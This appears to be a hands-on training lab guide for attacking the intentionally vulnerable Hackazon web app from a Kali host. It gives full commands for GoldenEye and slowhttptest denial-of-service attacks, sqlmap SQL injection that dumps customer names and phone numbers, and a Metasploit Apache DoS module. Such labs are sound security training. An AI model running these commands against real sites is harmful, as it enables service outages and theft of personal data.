Attack Unprotected Web App
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Tasks in red performed on Kali host

-  Tasks in blue performed on Hackazon

1. Open a putty session to the Kali server and Hackazon server

2. Verify site availability and capture server stats

   a. Browse http://hackazon.f5agility.com

   b. (Hackazon) View server base stats

      i.   # free -m

      ii.  # pgrep httpd \| wc -l

      iii. # top

   c. Open BIG-IP Dashboard

3. Attack via GoldenEye

   a. (Kali) Browse to GoldenEye directory and execute attack.

      i.  # cd /root/Agility/GoldenEye

      ii. # ./goldeneye.py http://hackazon.f5agility.com -d -w 50 -s 200

   b. Is site available?

      i. http://hackazon.f5agility.com

   c. (Hackazon) Observe impact

      i.  # top

      ii. # free -m

   d. (Kali) Stop attack

      i. <Ctrl>+C

4. Verify test site availability

   a. http://hackazon.f5agility.com

   b. If site unavailable, restart web service on Hackazon host

      i. # /etc/init.d/apache2 restart

5. Attack via SLOWHTTPTEST

   a. (Kali) Browse to slowhttptest directory and execute attack

      i.  # cd /root/Agility/slowhttptest

      ii. |image6|\ # slowhttptest -c 1000 -H -g -o
          slowloris\_stats\_lab1 -i 10 -r 200 -s 8192 -t GET -u
          http://hackazon.f5agility.com -x 24 -p 3

   b. Is site available?

   c. (Hackazon) Observe impact

      i.  # top

      ii. # free -m

   d. (Kali) Stop Attack

      i. <Ctrl>+C

   e. (Hackazon) Restart web services

      i. # /etc/init.d/httpd restart

6. Attack via SQLMap

   a. To begin we’ll need to browse the site for a URL that looks
      injectable, like this one:

      i. http://hackazon.f5agility.com/product/view?id=51

   b. (Kali) Determine database type

      i.   |image7|\ # sqlmap -u
           http://hackazon.f5agility.com/product/view?id=51 --dbs

      ii.  Select ‘C’

      iii. |image8|\ DB identified as ‘MySQL’, Select ‘Y’, then ‘Y’

   c. (Kali) Determine Table Names

      i.  |image9|\ Choose a discovered Database and query for table

      ii. |image10|\ # sqlmap -u
          http://hackazon.f5agility.com/product/view?id=51 -D hackazon
          --tables

   d. Now for the columns

      i. sqlmap -u http://hackazon.f5agility.com/product/view?id=51 -D
         hackazon -T tbl\_customer\_address --columns

   e. |image11|\ And finally…lets extract some data

      i. sqlmap -u http://hackazon.f5agility.com/product/view?id=51 -D
         hackazon -T tbl\_customer\_address -C full\_name,phone,zip
         --dump

   f. Did these attacks bring the site offfline?

7. (Optional) Attack via Metasploit

   a. (Kali) Open Metasploit console

      i. # msfconsole

   b. (Kali) Port scan the vulnerable host

      i. msf > nmap -sS -A hackazon.f5agility.com

    |image12|

a. Search for an exploit

   i. Take information provided above and find an exploit/CVE!

b. (Kali) Configure exploit (example)

   i.   msf > use auxiliary/dos/http/apache\_range\_dos

   ii.  msf auxiliary(apache\_range\_dos) > show options

   iii. set RHOSTS 10.128.20.210

c. (Kali) Attack!

   i. msf > run

d. Is site available?

e. (Hackazon) Observe impact

   i.  # top

   ii. # free –m

f. Stop attack

g. # /etc/init.d/httpd restart
